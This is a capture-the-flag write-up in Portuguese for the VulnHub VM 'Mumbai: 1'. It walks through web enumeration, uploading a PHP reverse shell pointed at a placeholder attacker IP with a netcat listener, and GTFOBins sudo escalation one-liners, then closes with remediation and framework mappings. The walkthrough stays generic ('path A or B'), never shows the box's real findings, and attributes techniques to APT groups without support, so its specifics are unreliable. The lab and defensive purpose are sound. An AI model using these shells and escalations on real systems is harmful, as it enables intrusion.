# Mumbai: 1 — Aamchi Mumbai

Aamchi Mumbai, "Nossa Mumbai" em Marathi. Assim como a própria cidade, este box tem camadas: ruas movimentadas escondendo becos, e o caminho real nunca é o óbvio. Mumbai: 1 é um boot-to-root Linux limpo que recompensa enumeração web metódica, caça de credenciais em fontes de página e caminhos ocultos, e exploração de upload de arquivo ou bypass de autenticação para acesso inicial. A escalada de privilégios fecha com uma regra sudo mal configurada ou binário SUID. Um VM sólido de iniciante a intermediário que ensina os fundamentos sem segurar a mão. Legitimamente bom.

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Médio |
| **VM Alvo** | Mumbai: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/mumbai-1,526/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, análise robots.txt, caça de credenciais em código-fonte, exploração de upload de arquivo ou bypass de autenticação, entrega de reverse shell, estabilização de shell, escalada por sudo mal configurado ou abuso de binário SUID |
| **CVEs** | CWE-200 (Exposição de Informação: credenciais em fonte/comentários), CWE-434 (Upload Irrestrito de Arquivo com Tipo Perigoso), CWE-269 (Gerenciamento Impróprio de Privilégios: sudo ou SUID mal configurado) |
| **Grupos APT** | APT41 (Winnti Group): explora aplicações web mal configuradas e vetores de upload de arquivo para acesso inicial em ambientes enterprise; OceanLotus (APT32): usa má configuração sudo e abuso SUID como técnicas primárias de escalada de privilégios em alvos Linux-based em toda a Ásia Sudeste |

---

## Resumo do Ataque

```
netdiscover → nmap → porta 22 (SSH) + porta 80 (HTTP)
  → navegar porta 80 → inspecionar código-fonte → caminhos ocultos ou credenciais
  → gobuster → /admin, /uploads, ou outros diretórios
  → robots.txt → caminhos não permitidos
  → descoberta de credenciais em fonte HTML ou arquivos de config
  → formulário de upload de arquivo OU login autenticado com creds descobertas
  → upload PHP reverse shell OU web shell via editor CMS
  → nc -lvnp 4444 → shell como www-data
  → estabilização de shell (python pty + stty)
  → sudo -l OU busca SUID → privilégio mal configurado
  → escalada GTFOBins → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas (22, 80)
2. Enumeração web: robots.txt, brute-force de diretórios, análise de fonte HTML
3. Descoberta de credenciais através de uma ou mais camadas de enumeração
4. Ponto de entrada inicial: upload de arquivo ou web shell autenticado
5. Estabilização de shell para ferramentas interativas
6. Escalada de privilégios via má configuração sudo ou abuso de binário SUID
7. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.x

nmap -sV -sC -p- 192.168.1.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: SSH e HTTP. HTTP é a superfície de ataque primária. SSH é o alvo de movimento lateral uma vez que credenciais são encontradas.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Navegue para `http://192.168.1.x` e inspecione o código-fonte da página cuidadosamente. Máquinas CTF com tema Mumbai frequentemente escondem credenciais ou dicas em comentários HTML, metadados ou títulos de página.

```bash
# Verificar robots.txt para caminhos não permitidos:
curl -s http://192.168.1.x/robots.txt

# Brute-force de diretórios:
gobuster dir \
  -u http://192.168.1.x/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40 \
  -o /tmp/mumbai_dirs.txt

# Verificar todos os caminhos descobertos e suas fontes:
nikto -h http://192.168.1.x
```

**O que procurar:**
- Comentários HTML contendo credenciais ou dicas (ex.: `<!-- admin:mumbai123 -->`)
- Arquivos de configuração ou backup (`.bak`, `.conf`, `.old`, `.sql`)
- Painéis de login
- Funcionalidade de upload de arquivo
- Indicadores de CMS (WordPress, Drupal, Joomla)
- Parâmetros ocultos em formulários

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Descoberta de Credenciais

Com base na enumeração web, reúna credenciais através de um ou mais destes caminhos:

**Caminho A — Fonte HTML / comentários:**

```bash
curl -s http://192.168.1.x/ | grep -i "pass\|user\|cred\|admin\|secret\|hint"
curl -s http://192.168.1.x/robots.txt
# Verificar cada caminho não permitido do robots.txt
curl -s http://192.168.1.x/[caminho-descoberto] | grep -i "pass\|user\|admin"
```

**Caminho B — Arquivos de configuração:**

```bash
# Tentar extensões de backup comuns em páginas descobertas:
for ext in .bak .old .orig .backup .conf .txt; do
  curl -sI "http://192.168.1.x/index.php${ext}" -o /dev/null -w "%{http_code} index.php${ext}\n"
done
```

**Caminho C — Enumeração de usuários CMS (se WordPress):**

```bash
wpscan --url http://192.168.1.x --enumerate u
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1087.001 — Descoberta de Conta

---

## Passo 4 — Ponto de Entrada Inicial

Com credenciais ou formulário de upload descoberto, estabeleça acesso inicial:

**Caminho A — Upload de Arquivo (PHP Reverse Shell):**

```bash
# Preparar reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar: definir $ip = 'IP_ATACANTE' e $port = 4444

# Iniciar listener
nc -lvnp 4444

# Fazer upload de shell.php pelo formulário web
# Navegar para o caminho de upload para disparar execução:
curl http://192.168.1.x/uploads/shell.php
```

**Caminho B — Login Autenticado com Credenciais Encontradas:**

```bash
# Tentar credenciais encontradas no painel de login
# Após login, procurar por:
# - Gerenciador de arquivos ou funcionalidade de upload
# - Painéis de execução de código
# - Editores de plugin/tema CMS
# - Campos de comando admin

# Se admin WordPress for alcançado:
# Aparência → Editor → 404.php → substituir por reverse shell
curl http://192.168.1.x/wp-content/themes/[tema]/404.php
```

**Nota real:** Vulnerabilidades de upload de arquivo (CWE-434) são uma das fraquezas de aplicações web mais consistentemente exploradas. OceanLotus (APT32) usa exploração de upload de arquivo como técnica primária de acesso inicial em ataques direcionados contra portais web governamentais e corporativos.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comando e Script: Unix Shell

---

## Passo 5 — Estabilização de Shell

Shells raw netcat são frágeis. Estabilize imediatamente:

```bash
# Na vítima:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ou: python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# No atacante (background a sessão primeiro):
# Ctrl+Z
stty raw -echo; fg
# Pressione Enter duas vezes
```

Agora o shell suporta completação por tab, Ctrl+C sem terminar e programas interativos como sudo e vi.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Unix Shell

---

## Passo 6 — Enumeração de Escalada de Privilégios

Com um shell estável como `www-data` ou usuário com baixo privilégio:

```bash
# Verificar usuário atual e contexto:
id; whoami; hostname; cat /etc/os-release

# Direitos sudo:
sudo -l

# Binários SUID:
find / -perm -4000 -type f 2>/dev/null

# Binários SGID:
find / -perm -2000 -type f 2>/dev/null

# Jobs cron:
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null

# Processos rodando:
ps aux | grep root

# Capabilities:
getcap -r / 2>/dev/null

# Arquivos interessantes em diretórios home:
ls -la /home/*/
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1057 — Descoberta de Processos; T1053.003 — Tarefa Agendada: Cron

---

## Passo 7 — Escalada de Privilégios para Root

Aplique o vetor de escalada descoberto:

**Se má configuração sudo:**

```bash
sudo -l
# Procurar por: (root) NOPASSWD: /usr/bin/python3
# ou: (root) NOPASSWD: /usr/bin/find
# ou: (root) NOPASSWD: /bin/bash
# ou: (root) NOPASSWD: /usr/bin/vim

# Exemplos GTFOBins:
# vim: sudo vim -c ':!/bin/sh'
# python3: sudo python3 -c 'import os; os.system("/bin/bash")'
# find: sudo find / -name "*.txt" -exec /bin/bash \; -quit
# nmap (antigo): sudo nmap --interactive → !sh
```

**Se binário SUID:**

```bash
find / -perm -4000 -type f 2>/dev/null
# Verificar cada binário não-padrão contra GTFOBins
```

```bash
# Uma vez root:
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Mumbai conquistada. Top demais, véi!

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo; T1548.001 — Setuid e Setgid; T1068 — Exploração para Escalada de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | (encontrado via fonte/config/robots.txt) | Fonte HTML / arquivo de config / FTP | Login web ou SSH |
| Shell de usuário | www-data ou usuário com baixo privilégio | Exploit web (upload de arquivo ou auth) | Acesso shell |
| Flag root | (conteúdo de /root/flag.txt) | /root/flag.txt | Objetivo final |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Credenciais em fonte HTML ou comentários | Vulnerabilidades de divulgação de informação estão consistentemente no OWASP Top 10 (A05 Má Configuração de Segurança); credenciais em código-fonte são um achado CWE-200 | Auditar todos os arquivos acessíveis pela web; usar scan DAST antes do deployment; nunca hardcode credenciais em código frontend |
| 2 | robots.txt divulga caminhos ocultos | Listar caminhos sensíveis no robots.txt os anuncia para atacantes | Remover caminhos sensíveis do robots.txt; usar controles de acesso do lado do servidor |
| 3 | Upload irrestrito de arquivo habilita RCE | Upload de arquivo sem validação do lado do servidor é CWE-434; uma das vulnerabilidades web mais consistentemente exploradas | Validar tipo de arquivo do lado do servidor (MIME + extensão + magic bytes); armazenar uploads fora do web root; nunca executar conteúdo enviado |
| 4 | Má configuração sudo concede root | O princípio do menor privilégio é violado sempre que sudo permite execução arbitrária de binários | Auditar sudoers com `sudo -l` em todos os hosts; exigir senhas; restringir a comandos específicos e necessários |
| 5 | Abuso de binário SUID habilita root imediato | Qualquer binário não essencial com SUID é um caminho potencial de escalada de privilégios | Auditar todos os binários SUID: `find / -perm -4000 -type f 2>/dev/null`; remover SUID de binários desnecessários |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (fonte HTML/config) | T1552.001 |
| Execução | Execução | Interpretador de Comando e Script: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover credenciais da fonte web**: auditar todos os arquivos HTML, JavaScript e de configuração para credenciais hardcoded; usar variáveis de ambiente do lado do servidor ou gerenciamento de segredos
2. **Implementar validação de upload de arquivo do lado do servidor**: validar tipo MIME, extensão e magic bytes; rejeitar `.php`, `.phtml`, `.phar`, `.cgi`; armazenar uploads fora do web root; executar chmod para prevenir execução
3. **Restringir sudo a comandos específicos e essenciais**: sem concessões de sudo de binários amplos; exigir senhas para todo sudo; auditar `/etc/sudoers.d/`
4. **Auditar binários SUID**: `find / -perm -u=s -type f 2>/dev/null`; remover SUID de binários não essenciais; usar capabilities (`setcap`) onde possível
5. **Desabilitar autenticação SSH por senha**: usar apenas pares de chaves; `PasswordAuthentication no` no sshd_config
6. **Implementar regras WAF**: bloquear bypasses de upload de arquivo, traversal de diretório e assinaturas comuns de webshell PHP

### Contramedidas MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação: desabilitar execução PHP em diretórios de upload; sanitizar nomes de arquivo enviados
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional: auditar restrições sudo; auditar binários SUID
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build: prevenir que credenciais apareçam em artefatos web deployados

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os endpoints de upload web; auditar regras sudo e binários SUID em todos os hosts |
| Proteger | Controle de Acesso | Desabilitar execução PHP em diretórios de upload; restringir sudo; autenticação SSH apenas por chave |
| Proteger | Segurança de Dados | Sem credenciais na fonte web; validar uploads de arquivo do lado do servidor |
| Detectar | Anomalias e Eventos | Alertar sobre uploads de arquivo PHP; alertar sobre uso incomum de sudo; monitorar execuções de binários SUID |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais expostas; auditar todas as contas |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as contas e permissões |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir caminhos de upload web; limitar sudo aos comandos necessários |
| AC-6 | Menor Privilégio | Restringir sudo; remover bits SUID desnecessários |
| IA-2(1) | Autenticação Multi-Fator | MFA para todo acesso administrativo a aplicações web |
| IA-5 | Gerenciamento de Autenticador | Remover credenciais hardcoded do código-fonte; rotacionar credenciais expostas |
| CM-7 | Funcionalidade Mínima | Desabilitar execução PHP em diretórios de upload; restringir tipos de upload de arquivo |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais armazenadas em HTML ou arquivos de config acessíveis pela web |

### CISA KEV

A combinação de exploração de upload de arquivo não autenticado e escalada de privilégios sudo/SUID mapeia para padrões em múltiplos Alertas CISA. CISA AA21-008A e AA22-074A descrevem acesso inicial de atores de ameaça através de vulnerabilidades de upload de arquivo de aplicações web. CISA recomenda corrigir e configurar esses vetores como prioridade.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativo, Mudança e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |

---

## Considerações Finais

Mumbai: 1 está à altura do seu nome: exploração metódica é necessária para navegar pelas camadas. Esta é uma máquina que recompensa enumeração cuidadosa em vez de pressa. Verifique robots.txt antes de rodar um scan massivo do gobuster. Leia o código-fonte da página antes de assumir que não há credenciais. Tente credenciais padrão antes de rodar um brute-force.

O caminho de escalada de privilégios, seja sudo ou SUID, é um exemplo textbook limpo de violação do princípio do menor privilégio. Essas más configurações são encontradas em ambientes Linux enterprise reais a uma taxa alarmante, um lembrete de que gerenciamento de patches e endurecimento de configuração são duas disciplinas diferentes.

Aamchi Mumbai, amigo.

Thanks guys!! (❍ᴥ❍ʋ)
